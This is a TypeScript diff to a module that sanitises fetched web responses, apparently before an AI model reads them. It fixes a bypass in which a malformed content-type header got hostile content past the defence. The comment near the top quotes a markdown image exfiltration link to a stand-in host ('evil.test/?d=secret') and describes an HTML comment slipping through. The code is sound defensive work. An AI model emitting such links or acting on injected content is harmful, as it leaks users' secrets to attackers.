@@ -243,7 +243,33 @@ export function defendText(text: string, options: DefendTextOptions): string {
         excludeJsonDocuments &&
         (contentTypeUndetermined || isSniffableContentType(options.contentType));
     const looksLikeJsonBody = jsonExemptionCouldApply && isDefinitelyJson(content);
-    const strictestGrammar = contentTypeUndetermined && !looksLikeJsonBody;
+    // **A content type the parser REJECTED arrives here as `undefined` while
+    // `contentTypeUndetermined` stays FALSE, so it must be tested for
+    // separately.** `parseResponseWithMetadata` resolves anything failing
+    // `MEDIA_TYPE_PATTERN` to `undefined`, but `contentTypeUndetermined` is
+    // keyed on a different absence — whether our own `-w` metadata block was
+    // found — and for a rejected header it was. Keying the strictest grammar on
+    // the flag alone therefore handed a malformed header the PERMISSIVE path:
+    // measured on the shipped bundle, a markdown body declared
+    // `text/markdown;;` returned `![x](https://evil.test/?d=secret)` and an
+    // HTML comment intact, where the same body declared `text/markdown`
+    // returned `[image removed]`. The remote chose which by malforming its own
+    // header — invariant 1a's stated failure shape, arriving through the guard
+    // added to stop the field carrying prose. `LESSONS.md` RC-31.
+    //
+    // Three facts, two representable states, so the disjunction is the fix
+    // rather than a third field: both arms mean "no usable declared grammar",
+    // which is exactly what `ParsedResponse.contentType`'s docblock already
+    // promises selects the strictest one downstream. It holds for the published
+    // `defendText` too (invariant 11) — a JavaScript consumer passing a
+    // rejected type with `contentTypeUndetermined: false` gets the strict arm.
+    //
+    // The JSON exemption above still applies: `isSniffableContentType(undefined)`
+    // is true via its `mime === ""` arm, so a genuinely-JSON body carrying a
+    // malformed header keeps its exemption and the persisted artefact is not
+    // rewritten.
+    const strictestGrammar =
+        (contentTypeUndetermined || options.contentType === undefined) && !looksLikeJsonBody;
 
     const isMarkup = strictestGrammar || supportsMarkupComments(options.contentType);
     const isMarkdown = strictestGrammar || isMarkdownContentType(options.contentType);
@@ -493,6 +519,16 @@ function defendInlineString(text: string, hostname: string): string {
 /**
  * Defend every string leaf of a parsed JSON value, leaving the structure alone.
  *
+ * **Two residuals of the round trip, and neither is an oversight.** A duplicate
+ * name collapses to its last occurrence at `JSON.parse`, BEFORE this walk runs
+ * — `{"total":5,"total":9}` re-serialises as `{"total":9}` — so a field can
+ * disappear from a document that stays valid JSON, and no care taken here
+ * recovers it. RFC 8259 leaves duplicate names undefined and making the parse
+ * preserve them needs a custom parser, so it is stated rather than fixed; it is
+ * the one field-loss the region-wise defence cannot prevent. This is a
+ * different question from key ORDER, which is a rearrangement and was declined
+ * as harmless. `LESSONS.md` RC-31. The second residual:
+ *
  * **Object KEYS are deliberately not defended.** Two keys that defended to the
  * same string would collapse into one, losing a field — which is the very
  * failure this function exists to stop, so the fix must not reintroduce it by
@@ -693,14 +729,32 @@ export function exceedsInlineCap(text: string, hostname: string, maxBytes: numbe
  *
  * `LESSONS.md` RC-30.
  */
-function savedMessage(
-    diskBytes: number,
-    filepath: string,
-    maxSize: number,
-    overCap: boolean,
-    contentType: string | undefined,
-    filtered: boolean
-): string {
+interface SavedMessageFacts {
+    /** Byte length of what was written, measured on the string written. */
+    diskBytes: number;
+    /** Absolute path of the artefact. */
+    filepath: string;
+    /** The caller's inline budget, named only on the over-cap arm. */
+    maxSize: number;
+    /** True when the cap forced the save; false when the caller asked for it. */
+    overCap: boolean;
+    /** Type/subtype only, or absent — see `ParsedResponse.contentType`. */
+    contentType: string | undefined;
+    /** True when the artefact is jq output rather than the response body. */
+    filtered: boolean;
+}
+
+/**
+ * An object rather than six positional arguments, because two of them are
+ * `number` and their meanings are not interchangeable. Transposing `diskBytes`
+ * and `maxSize` produced *"Response (500000 bytes on disk) … exceeds the
+ * 9400000-byte inline limit"* — a sentence that tells a model to raise
+ * `max_result_size` to clear a limit it never hit — and it compiled, and it
+ * passed, because the only assertion on that arm was `toContain("exceeds the")`.
+ * The shape is the fix; there is no runtime check to add. `LESSONS.md` RC-31.
+ */
+function savedMessage(facts: SavedMessageFacts): string {
+    const { diskBytes, filepath, maxSize, overCap, contentType, filtered } = facts;
     const subject = filtered ? "Result of jq_filter" : "Response";
 
     const cause = overCap
@@ -715,8 +769,14 @@ function savedMessage(
         filtered || isJsonContentType(contentType)
             ? " Use the jq_query tool on that path to extract fields."
             : contentType === undefined
-              ? " The content type was not declared, so the grammar is unknown — try the jq_query" +
-                " tool on that path; it reports plainly if the file is not JSON."
+              ? // NOT "was not declared". This arm is also reached when the origin
+                // DID declare a content type and it was rejected as malformed, so
+                // asserting the origin sent nothing would be a server-authored
+                // falsehood about the origin. Both causes mean the same thing to
+                // the reader — there is no usable grammar — so the wording says
+                // that rather than guessing which one happened. `LESSONS.md` RC-31.
+                " No usable content type was declared, so the grammar is unknown — try the" +
+                " jq_query tool on that path; it reports plainly if the file is not JSON."
               : " The body is not JSON, so the jq_query tool cannot parse it; read the path with" +
                 " your own tooling.";
 
@@ -759,7 +819,9 @@ function savedMessage(
  *    that the original-text Step 2 detection couldn't see (it saw the
  *    entity-encoded form). The re-detection here closes the silenced-
  *    log gap; throttling prevents same-hostname noise.
- * 6. Apply jq_filter if provided AND response is JSON. Re-sanitise after
+ * 6. Apply jq_filter if provided AND the body is JSON — by declared content
+ *    type, or by a leading `{`/`[` when the declared type says otherwise.
+ *    Neither, and it throws. Re-sanitise after
  *    filter (JSON.parse may decode escapes into real attack chars).
  * 7. Check size against `maxResultSize`; auto-save to file if exceeded.
  *    NOTE: post-pipeline byte length is NOT guaranteed monotone-shrinking
@@ -771,7 +833,8 @@ function savedMessage(
  *                   string (the type system enforces this for TS callers,
  *                   but JS callers from custom-tool hooks could bypass).
  * @param options - Processing options (url, jqFilter, maxResultSize, etc.)
- * @returns ProcessedResponse with content and file save status
+ * @returns ProcessedResponse — the inline arm carries `content`; the saved arm
+ *          carries `filepath` and `message` and no body bytes at all
  * @throws TypeError if `response` is not a string
  * @throws Error if response exceeds the absolute size cap or jq_filter
  *   is used on non-JSON content
@@ -905,14 +968,14 @@ export async function processResponse(
         return {
             savedToFile: true,
             filepath,
-            message: savedMessage(
-                Buffer.byteLength(content, "utf8"),
+            message: savedMessage({
+                diskBytes: Buffer.byteLength(content, "utf8"),
                 filepath,
                 maxSize,
                 overCap,
-                options.contentType,
-                options.jqFilter !== undefined
-            ),
+                contentType: options.contentType,
+                filtered: options.jqFilter !== undefined,
+            }),
         };
     }
 
